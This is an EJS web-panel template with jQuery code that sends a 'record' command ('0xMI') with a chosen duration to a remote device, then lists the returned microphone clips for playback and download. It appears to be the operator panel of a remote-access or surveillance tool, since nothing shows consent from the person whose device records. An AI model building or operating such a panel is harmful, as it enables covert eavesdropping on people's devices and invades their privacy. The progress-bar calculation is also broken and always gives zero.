<div class="bg-gray-700 rounded-lg p-4 mb-4">
    <div class="space-y-4">
        <div class="flex gap-2">
            <input type="number" placeholder="Duration (seconds)" 
                   class="bg-gray-600 text-white rounded-lg p-2 flex-1" 
                   id="seconds" min="0" max="120">
            <button onclick="record(this)" 
                    class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-lg flex items-center">
                <i class="icon microphone mr-2"></i>
                Record
            </button>
        </div>
        
        <div class="h-2 bg-gray-600 rounded-full overflow-hidden">
            <div class="bg-green-500 h-full transition-all duration-100" id="recProg"></div>
        </div>
    </div>

    <div class="mt-6 space-y-2">
        <% pageData.forEach((item) => { %>
        <div class="flex items-center justify-between bg-gray-600 p-3 rounded hover:bg-gray-500">
            <div>
                <p class="text-sm"><%= new Date(item.time).toLocaleString('en-GB', { timeZone: 'UTC' }) %></p>
                <p class="text-gray-300"><%= item.originalName %></p>
            </div>
            <div class="flex gap-2">
                <button onclick="playClip('<%= item.path %>')" 
                        class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded">
                    Play
                </button>
                <a href="<%= item.path %>" download="<%= item.originalName %>" 
                   class="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded">
                    Save
                </a>
            </div>
        </div>
        <% }) %>
    </div>
</div>

<audio id="player">
    <source id="audioSource" src="" type="audio/mpeg">
    </source>
    Your browser does not support the audio element.
</audio>

<script>
    function playClip(input) {
        var player = document.getElementById('player');
        $("#audioSource").attr("src", input);
        player.load();
        var playPromise = player.play();
        if (playPromise !== undefined) playPromise.then(_ => { }).catch(error => { });
    }

</script>

<script>
    function record(element) {
        $(element).addClass('loading')
        let sec = $('#seconds').val();
        sendCommand('0xMI', { sec }, (error, message) => {
            if (error) {
                setTimeout(() => {
                    showNotification('#f03434', error)
                    $(element).removeClass('loading')
                }, 300)
            } else {
                setTimeout(() => {
                    $(element).removeClass('loading');

                    let timeLeft = ((parseInt(sec) + 10) * 1000);
                    let timeItsGonnaTake = (parseInt(sec) + 10);

                    if (message === 'Requested') {
                        showNotification('#2ecc71', 'Now Recording, Check back in ' + timeItsGonnaTake + ' ish Seconds for the result!');
                        const progressBar = document.getElementById('recProg');
                        let percent = (((timeItsGonnaTake * 1000) * 100) / timeLeft) - 100;
                        progressBar.style.width = `${Math.min(percent, 100)}%`;
                    } else showNotification('#2ecc71', message);
                }, 300)
            }
        });
    }
</script>